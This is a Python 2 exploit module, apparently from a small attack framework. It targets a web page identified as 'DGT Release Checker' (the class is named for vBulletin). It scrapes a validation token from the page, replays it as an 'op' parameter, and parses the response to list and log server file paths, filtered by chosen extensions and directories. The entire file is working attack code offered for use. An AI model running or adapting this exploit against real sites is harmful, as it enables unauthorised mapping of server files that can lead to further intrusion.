import re
from http import *
from exploitbase import *

class vbbvalidator(Exploiter):

	def __init__(self):
		super(vbbvalidator, self).__init__()
		self.params["debug_level"] = 1
		self.params["ext_list"] = []
		self.params["dir_list"] = []

	def startExploit(self):
		result = False
		print "Testing target: " + self.params["url"]
		res = self.getData(self.params["url"],0,{})
		if res.find("DGT Release Checker") != -1:
			result = True
			print "Target found! Exploiting...."
			startidx = res.find("validate('")
			endidx = res.find("')",startidx + 1)
			if startidx != -1 and endidx != -1:
				self.setUrl(self.params["url"] + "?op=" + res[startidx + len("validate('"):endidx])
			#print self.params["url"]
			#self.setResFile("val.html")
			res = self.getData(self.params["url"],0,{})
			line = res.splitlines()
			print "Listing all matching files base on user conditions..."
			print "-----------------------------"
			cnt = 0
			if res.find("&nbsp;</td>") == -1:
				for l in line:
					matchobj = re.match(r'.+<td>(.+)\s</td>',l,re.M|re.I)			
					if matchobj:
						filepath = matchobj.group(1)
						fileext = filepath[len(filepath) - 3:len(filepath)]
						if fileext in self.params["ext_list"]:
							print filepath
							self.writeLog(filepath)
							cnt += 1
						elif self.isIndir(filepath):
							print filepath
							cnt += 1
							self.writeLog(filepath)
			else:
				for l in line:
					matchobj = re.match(r'.+<td>(.+)&nbsp;</td>',l,re.M|re.I)			
					if matchobj:
						filepath = matchobj.group(1)
						fileext = filepath[len(filepath) - 3:len(filepath)]
						if fileext in self.params["ext_list"]:
							print filepath
							self.writeLog(filepath)
							cnt += 1
						elif self.isIndir(filepath):
							print filepath
							cnt += 1
							self.writeLog(filepath)
			print "-----------------------------"
			print "Found " + str(cnt) + " files!"
		else:
			print "Target not vulnerable"

	def setInterestingExt(self,extlist):
		self.params["ext_list"] = extlist

	def isIndir(self,path):
		for d in self.params["dir_list"]:
			if path.find(d) != -1:
				return True
		return False
	
	def setInteresting(self,extlist,dirlist):
		self.setInterestingExt(extlist)
		self.params["dir_list"] = dirlist
